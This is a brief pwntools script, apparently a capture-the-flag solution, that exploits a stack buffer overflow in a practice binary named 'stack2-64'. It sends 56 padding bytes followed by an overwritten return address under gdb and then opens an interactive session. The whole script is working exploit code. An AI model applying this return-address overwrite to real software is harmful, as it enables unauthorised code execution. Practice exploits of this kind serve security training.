from pwn import *

context.binary = "/problems/stack2r-64_7_6f3f38bb74a66565cc9342709dadda5e/stack2-64"
context.log_level = "debug"

offset = 56

p = gdb.debug([context.binary.path], gdbscript='''

        break *main
        break *recalibration
        shell tmux swap-plane -U
        shell tmux select-layer main-vertical
        continue
''')

#p = process([context.binary.path])

# exploit_str = flat({56:p64(0x555547aa)}, endianness = 'little')
exploit_str = b"A" * offset + p64(0x5555555547aa)
print(exploit_str)
# exploit_str = cyclic(100)
p.sendline(exploit_str)
p.interactive()

